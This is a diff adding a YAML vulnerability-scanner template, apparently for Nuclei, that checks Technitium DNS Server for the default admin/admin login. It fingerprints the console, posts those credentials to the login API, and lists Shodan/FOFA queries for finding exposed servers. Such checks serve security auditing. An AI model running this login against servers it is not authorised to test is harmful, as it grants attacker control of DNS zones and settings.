@@ -1,0 +1,69 @@
+id: technitium-dns-server-default-login
+
+info:
+  name: Technitium DNS Server - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    Technitium DNS Server creates the built-in administrator account admin with the password admin on first start unless DNS_SERVER_ADMIN_PASSWORD or DNS_SERVER_ADMIN_PASSWORD_FILE is set, and the password stays valid until it is changed. An attacker who logs in to the web console with these credentials gets the Administrators group and can change zones and records, blocking lists, forwarders, DHCP scopes, installed DNS apps, users and server settings.
+  reference:
+    - https://github.com/TechnitiumSoftware/DnsServer/blob/v15.6.2/APIDOCS.md#login
+    - https://github.com/TechnitiumSoftware/DnsServer/blob/v15.6.2/DnsServerCore/Auth/AuthManager.cs
+    - https://github.com/TechnitiumSoftware/DnsServer/blob/v15.6.2/DockerEnvironmentVariables.md
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:a:technitium:dnsserver:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    vendor: technitium
+    product: dnsserver
+    shodan-query: http.title:"Technitium DNS Server"
+    fofa-query: title="Technitium DNS Server"
+  tags: technitium,dns,default-login,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "<title>Technitium DNS Server</title>", "js/main.js")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /api/user/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        user={{username}}&pass={{password}}&includeInfo=true
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - admin
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains_all(body, "\"username\":\"admin\"", "\"dnsServerDomain\":", "\"status\":\"ok\"")'
+          - 'regex("\"token\":\"[a-f0-9]{64}\"", body)'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
